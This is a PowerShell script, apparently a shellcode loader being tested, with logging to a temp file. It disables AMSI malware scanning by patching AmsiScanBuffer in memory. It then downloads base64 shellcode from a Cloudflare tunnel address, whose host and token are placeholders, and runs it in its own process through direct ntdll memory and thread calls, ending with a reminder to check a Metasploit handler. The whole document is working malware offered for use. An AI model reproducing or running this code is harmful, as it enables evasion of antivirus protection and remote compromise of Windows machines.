# Ultra verbose debug - logs to file
$log = "C:\Windows\Temp\inject_debug.txt"

function Log($msg) {
    "$([DateTime]::Now.ToString('HH:mm:ss')) $msg" | Out-File -Append $log
    Write-Host $msg
}

Log "[START] Debug injection test"

# AMSI bypass
$W=@"
using System;using System.Runtime.InteropServices;
public class W{
[DllImport("kernel32")]public static extern IntPtr GetProcAddress(IntPtr m,string p);
[DllImport("kernel32")]public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32")]public static extern bool VirtualProtect(IntPtr a,UIntPtr s,uint n,out uint o);
}
"@
try {
    Add-Type $W
    $L=[W]::LoadLibrary("am"+"si.dll")
    $A=[W]::GetProcAddress($L,"Amsi"+"Scan"+"Buffer")
    $p=0
    [W]::VirtualProtect($A,[UIntPtr]::new(0x20),0x40,[ref]$p)|Out-Null
    $B=[Byte[]](0x41,0x5F,0x41,0x5E,0x5F,0xB8,0x57,0x00,0x07,0x80,0xC3)
    $A=[Int64]$A+0x14
    [Runtime.InteropServices.Marshal]::Copy($B,0,[IntPtr]$A,$B.Length)
    [W]::VirtualProtect([IntPtr]$A,[UIntPtr]::new(0x20),$p,[ref]$p)|Out-Null
    Log "[OK] AMSI bypassed"
} catch {
    Log "[FAIL] AMSI bypass: $_"
}

[Net.ServicePointManager]::SecurityProtocol='Tls12'

# Test network connectivity
$testUrl = 'https://CHANGE-MECHANGE-ME.trycloudflare.com/payloads/shellcode.txt?key=PLACEHOLDER_TOKEN'
Log "[TEST] Downloading shellcode from: $testUrl"

try {
    $sc = [Convert]::FromBase64String((New-Object Net.WebClient).DownloadString($testUrl))
    Log "[OK] Downloaded $($sc.Length) bytes of shellcode"
} catch {
    Log "[FAIL] Download error: $_"
    exit
}

# Syscall injection
$code = @'
using System;
using System.Runtime.InteropServices;
public class Syscall {
    [DllImport("ntdll.dll")]
    public static extern uint NtAllocateVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, IntPtr ZeroBits, ref IntPtr RegionSize, uint AllocationType, uint Protect);
    [DllImport("ntdll.dll")]
    public static extern uint NtWriteVirtualMemory(IntPtr ProcessHandle, IntPtr BaseAddress, byte[] Buffer, uint NumberOfBytesToWrite, out uint NumberOfBytesWritten);
    [DllImport("ntdll.dll")]
    public static extern uint NtProtectVirtualMemory(IntPtr ProcessHandle, ref IntPtr BaseAddress, ref IntPtr RegionSize, uint NewProtect, out uint OldProtect);
    [DllImport("ntdll.dll")]
    public static extern uint NtCreateThreadEx(out IntPtr ThreadHandle, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr StartAddress, IntPtr Parameter, bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr BytesBuffer);
    [DllImport("kernel32.dll")]
    public static extern IntPtr GetCurrentProcess();
}
'@
Add-Type $code
Log "[OK] Loaded syscall definitions"

$hProcess = [Syscall]::GetCurrentProcess()

# Allocate
$baseAddr = [IntPtr]::Zero
$regionSize = [IntPtr]::new($sc.Length + 4096)
$status = [Syscall]::NtAllocateVirtualMemory($hProcess, [ref]$baseAddr, [IntPtr]::Zero, [ref]$regionSize, 0x3000, 0x04)
if ($status -ne 0) {
    Log "[FAIL] NtAllocateVirtualMemory: 0x$($status.ToString('X'))"
    exit
}
Log "[OK] Allocated at: 0x$($baseAddr.ToString('X16'))"

# Write
$written = [uint32]0
$status = [Syscall]::NtWriteVirtualMemory($hProcess, $baseAddr, $sc, [uint32]$sc.Length, [ref]$written)
if ($status -ne 0) {
    Log "[FAIL] NtWriteVirtualMemory: 0x$($status.ToString('X'))"
    exit
}
Log "[OK] Written: $written bytes"

# Protect RX
$protectAddr = $baseAddr
$protectSize = [IntPtr]::new($sc.Length)
$oldProtect = [uint32]0
$status = [Syscall]::NtProtectVirtualMemory($hProcess, [ref]$protectAddr, [ref]$protectSize, 0x20, [ref]$oldProtect)
if ($status -ne 0) {
    Log "[FAIL] NtProtectVirtualMemory: 0x$($status.ToString('X'))"
    exit
}
Log "[OK] Memory now RX"

# Execute
$hThread = [IntPtr]::Zero
$status = [Syscall]::NtCreateThreadEx([ref]$hThread, 0x1FFFFF, [IntPtr]::Zero, $hProcess, $baseAddr, [IntPtr]::Zero, $false, 0, 0, 0, [IntPtr]::Zero)
if ($status -ne 0) {
    Log "[FAIL] NtCreateThreadEx: 0x$($status.ToString('X'))"
    exit
}
Log "[OK] Thread created: 0x$($hThread.ToString('X16'))"
Log "[OK] Shellcode executing - check MSF handler!"

Start-Sleep -Seconds 5
Log "[END] Test complete - check C:\Windows\Temp\inject_debug.txt for full log"
